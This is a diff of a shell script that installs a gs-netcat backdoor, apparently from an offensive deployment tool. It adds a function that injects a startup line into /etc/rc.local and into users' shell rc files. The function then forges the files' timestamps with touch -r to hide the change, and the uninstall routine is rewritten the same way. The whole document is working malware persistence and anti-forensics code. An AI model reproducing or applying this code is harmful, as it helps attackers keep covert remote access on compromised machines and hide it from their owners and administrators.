@@ -25,6 +25,9 @@
 # 		- Use binaries from ../packaging/gsnc-deploy-bin/
 #		- Verbose output
 #		- Shorter timeout to restart crontab etc
+#       - Also sets GS_USELOCAL=1
+# GS_USELOCAL=1
+#       - Use local binaries (do not download)
 # GS_NOINST=1
 #		- Do not install backdoor
 # GS_PREFIX=path
@@ -211,10 +214,10 @@ init_setup()
 		mkdir -p "${GS_PREFIX}/usr/bin" 2>/dev/null
 		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
 		if [[ -f "${HOME}/${RC_FILENAME}" ]]; then
-			cp "${HOME}/${RC_FILENAME}" "${RC_FILE}"
+			cp -p "${HOME}/${RC_FILENAME}" "${RC_FILE}"
 			touch -r "${HOME}/${RC_FILENAME}" "${RC_FILE}"
 		fi
-		cp /etc/rc.local "${GS_PREFIX}/etc/"
+		cp -p /etc/rc.local "${GS_PREFIX}/etc/"
 		touch -r /etc/rc.local "${GS_PREFIX}/etc/rc.local"
 	fi
 
@@ -278,11 +281,13 @@ uninstall_rc()
 
 	grep "${BIN_HIDDEN_NAME}" "$1" &>/dev/null || return # not installed
 
-	grep -v "${BIN_HIDDEN_NAME}" "$1" >"${1}-new" 2>/dev/null
-	[[ ! -f "${1}-new" ]] && return # permission denied
+	touch -r "${1}" "${1}-ts"
+	[[ ! -f "${1}-ts" ]] && return # permission denied
+	D="$(grep -v "${BIN_HIDDEN_NAME}" "$1")"
+	echo "$D" >"${1}"
+	touch -r "${1}-ts" "${1}"
+	rm -f "${1}-ts"
 
-	touch -r "$1" "${1}-new"
-	mv "${1}-new" "$1"
 	[[ ! -s "${1}" ]] && rm -f "${1}" 2>/dev/null # delete zero size file
 }
 
@@ -421,6 +426,25 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}"
 	IS_INSTALLED=1
 }
 
+# inject a string ($2) into the 2nd line of a file and retain the
+# PERM/TIMESTAMP of the target file ($1)
+install_to_file()
+{
+	local fname="$1"
+	local dline="$2"
+
+	touch -r "${fname}" "${fname}-ts"
+
+	D="$(head -n1 "${fname}" && \
+		echo "$NOTE_DONOTREMOVE" && \
+		echo "${dline}" &&
+		tail -n +2 "${fname}")"
+	echo "$D" >"${fname}"
+
+	touch -r "${fname}-ts" "${fname}"
+	rm -f "${fname}-ts"
+}
+
 install_system_rclocal()
 {
 	[[ ! -f "${RCLOCAL_FILE}" ]] && return
@@ -434,14 +458,8 @@ install_system_rclocal()
 
 	# /etc/rc.local is /bin/sh which does not support the build-in 'exec' command.
 	# Thus we need to start /bin/bash -c in a sub-shell before 'exec gs-netcat'.
-	(head -n1 "${RCLOCAL_FILE}" && \
-	echo "$NOTE_DONOTREMOVE" && \
-	echo "$RCLOCAL_LINE" && \
-	tail -n +2 "${RCLOCAL_FILE}") >"${RCLOCAL_FILE}-new" 2>/dev/null || return # not writeable
 
-	# restore file's timestamp
-	touch -r "${RCLOCAL_FILE}" "${RCLOCAL_FILE}-new"
-	mv "${RCLOCAL_FILE}-new" "${RCLOCAL_FILE}"
+	install_to_file "${RCLOCAL_FILE}" "$RCLOCAL_LINE"
 
 	gs_secret_write "$RCLOCAL_SEC_FILE"
 
@@ -500,12 +518,7 @@ install_user_profile()
 		return
 	fi
 
-	(echo "$NOTE_DONOTREMOVE" && \
-	echo "${PROFILE_LINE}" && \
-	cat "${RC_FILE}") >"${RC_FILE}-new"
-
-	touch -r "${RC_FILE}" "${RC_FILE}-new"
-	mv "${RC_FILE}-new" "${RC_FILE}"
+	install_to_file "${RC_FILE}" "${PROFILE_LINE}"
 
 	IS_INSTALLED=1
 	OK_OUT
